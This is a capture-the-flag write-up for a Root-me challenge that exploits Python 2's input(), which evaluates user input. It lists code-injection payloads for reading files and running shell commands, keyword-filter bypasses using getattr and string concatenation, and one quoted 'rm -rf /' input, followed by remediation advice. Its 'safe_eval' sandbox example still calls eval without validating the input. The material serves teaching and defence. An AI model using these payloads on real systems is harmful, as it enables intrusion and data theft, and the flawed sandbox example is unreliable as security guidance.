# Python - Input()

**Category:** App-Script  
**Difficulty:** ⭐⭐ (Medium)  
**Points:** 15  
**Platform:** Root-me

---

## 📋 Challenge Description

This challenge exploits a dangerous vulnerability in Python 2's `input()` function. Unlike Python 3, Python 2's `input()` evaluates user input as Python code, allowing arbitrary code execution.

**Objective:** Exploit the `input()` vulnerability to read the password file.

---

## 🎯 Learning Objectives

- Understand Python 2 vs Python 3 differences
- Exploit `input()` vulnerability
- Execute arbitrary Python code
- Achieve file read through code injection
- Learn secure input handling

---

## 🔍 Understanding the Vulnerability

### Python 2 vs Python 3

**Python 2 (Vulnerable):**
```python
# Python 2
user_input = input("Enter something: ")
# Evaluates input as Python code!
```

**Python 3 (Safe):**
```python
# Python 3
user_input = input("Enter something: ")
# Treats input as string
```

### The Danger

Python 2's `input()` is equivalent to `eval(raw_input())`:

```python
# Python 2 - These are equivalent:
input()
eval(raw_input())
```

This means user input is executed as Python code!

---

## 💥 Exploitation

### Basic Testing

```python
# Test 1: Simple arithmetic
Enter something: 2+2
# Output: 4

# Test 2: String
Enter something: "hello"
# Output: hello

# Test 3: Variable
Enter something: __import__('os')
# Returns os module object
```

### Method 1: Import and Execute

```python
# Import os module and execute commands
__import__('os').system('cat .passwd')

# Alternative
__import__('os').popen('cat .passwd').read()
```

### Method 2: File Reading

```python
# Direct file reading
open('.passwd').read()

# Alternative
open('/challenge/app-script/ch11/.passwd').read()

# With error handling
open('.passwd','r').read()
```

### Method 3: Subprocess Module

```python
# Using subprocess
__import__('subprocess').check_output(['cat', '.passwd'])

# Or
__import__('subprocess').call(['cat', '.passwd'])
```

### Method 4: Shell Command

```python
# Execute shell command and get output
__import__('os').popen('ls -la').read()

# Read specific file
__import__('os').popen('cat .passwd').read()
```

---

## 🔑 Solution

**Complete Exploitation Steps:**

1. **Connect to Challenge:**
```bash
ssh app-script-python@challenge.root-me.org -p 2222
```

2. **Run the Vulnerable Script:**
```bash
./vulnerable_script.py
```

3. **Exploit the input() Function:**
```python
Enter your input: open('.passwd').read()
```

**Alternative Payloads:**
```python
# Payload 1: Direct file read
open('.passwd').read()

# Payload 2: Using os.system
__import__('os').system('cat .passwd')

# Payload 3: Using os.popen
__import__('os').popen('cat .passwd').read()

# Payload 4: Subprocess
__import__('subprocess').check_output(['cat','.passwd']).decode()
```

**Password:** `[hidden for learning purposes]`

---

## 📚 Lessons Learned

### 1. Python 2 input() Vulnerability

**Why It's Dangerous:**

```python
# Python 2 vulnerable code
username = input("Enter username: ")

# If user enters: __import__('os').system('rm -rf /')
# This executes the command!
```

**Safe Alternative:**
```python
# Python 2 - Use raw_input() instead
username = raw_input("Enter username: ")

# Python 3 - input() is safe
username = input("Enter username: ")
```

### 2. eval() and exec() Dangers

Similar vulnerabilities exist with `eval()` and `exec()`:

```python
# Dangerous
user_code = input("Enter code: ")
eval(user_code)  # Executes arbitrary code

# Also dangerous
exec(user_code)  # Executes arbitrary statements
```

### 3. Python Code Injection Techniques

**Common Injection Methods:**

```python
# File operations
open('file').read()
open('file','w').write('data')

# Command execution
__import__('os').system('command')
__import__('os').popen('command').read()
__import__('subprocess').call(['command'])

# Module import
__import__('module_name')

# Environment access
__import__('os').environ

# Built-in functions
exec('code')
eval('expression')
compile('code', '<string>', 'exec')
```

### 4. Bypassing Filters

If certain keywords are filtered:

```python
# Bypass 'import' filter
__import__('os')
getattr(__builtins__, '__im' + 'port__')('os')

# Bypass 'open' filter
getattr(__builtins__, 'op' + 'en')('file')

# Bypass dot notation
getattr(__import__('os'), 'system')('command')

# String concatenation
eval('__im' + 'port__("os").sys' + 'tem("ls")')
```

---

## 🛡️ Remediation

### Secure Code Practices

**1. Use Appropriate Input Function:**

```python
# Python 2 - Use raw_input()
user_input = raw_input("Enter something: ")  # Returns string

# Python 3 - Use input() (it's safe)
user_input = input("Enter something: ")  # Returns string
```

**2. Avoid eval() and exec():**

```python
# Bad
user_data = input("Enter data: ")
result = eval(user_data)  # Dangerous!

# Good - Validate and parse
user_data = input("Enter number: ")
if user_data.isdigit():
    result = int(user_data)
else:
    print("Invalid input")
```

**3. Input Validation:**

```python
import re

def validate_input(user_input):
    # Only allow alphanumeric characters
    if re.match("^[a-zA-Z0-9]+$", user_input):
        return True
    return False

user_input = input("Enter username: ")
if validate_input(user_input):
    process_input(user_input)
else:
    print("Invalid input")
```

**4. Use Safe Alternatives:**

```python
# For mathematical expressions - use ast.literal_eval
import ast

user_input = input("Enter number: ")
try:
    number = ast.literal_eval(user_input)
    if isinstance(number, (int, float)):
        print(f"Valid number: {number}")
except:
    print("Invalid input")
```

**5. Sandboxing:**

If you must eval user code, use sandboxing:

```python
# Restricted evaluation
import ast
import operator

# Safe operators
safe_operators = {
    ast.Add: operator.add,
    ast.Sub: operator.sub,
    ast.Mult: operator.mul,
    ast.Div: operator.truediv,
}

def safe_eval(expr):
    node = ast.parse(expr, mode='eval')
    # Validate and evaluate safely
    # (simplified example)
    return eval(compile(node, '<string>', 'eval'))
```

---

## 🔧 Detection and Prevention

### Code Review Checklist

- [ ] No use of Python 2's `input()`
- [ ] No use of `eval()` on user input
- [ ] No use of `exec()` on user input
- [ ] Input validation in place
- [ ] Using Python 3 (Python 2 is EOL)

### Security Tools

```bash
# Static analysis
bandit -r .  # Python security linter

# Find dangerous functions
grep -r "eval(" .
grep -r "exec(" .
grep -r "input(" .  # In Python 2 code
```

---

## 📖 References

- [Python 2 Input Function](https://docs.python.org/2/library/functions.html#input)
- [Python 3 Input Function](https://docs.python.org/3/library/functions.html#input)
- [OWASP Code Injection](https://owasp.org/www-community/attacks/Code_Injection)
- [Python Security Best Practices](https://python.readthedocs.io/en/stable/library/security.html)

---

## 💡 Practice Tips

### Testing Locally

Create a vulnerable script:

```python
#!/usr/bin/env python2
# vulnerable.py

print("Vulnerable Python 2 Script")
user_input = input("Enter something: ")
print("You entered:", user_input)
```

Test exploitation:
```bash
python2 vulnerable.py
# Try: open('/etc/passwd').read()
```

### Payloads to Try

```python
# File read
open('file.txt').read()

# Directory listing
__import__('os').listdir('.')

# Command execution
__import__('os').system('whoami')

# Environment variables
__import__('os').environ

# Module exploration
dir(__import__('os'))
```

---

**Date Completed:** November 2025  
**Time Taken:** 15 minutes  
**Difficulty Rating:** 6/10

---

*Always use raw_input() in Python 2, or better yet, upgrade to Python 3!*
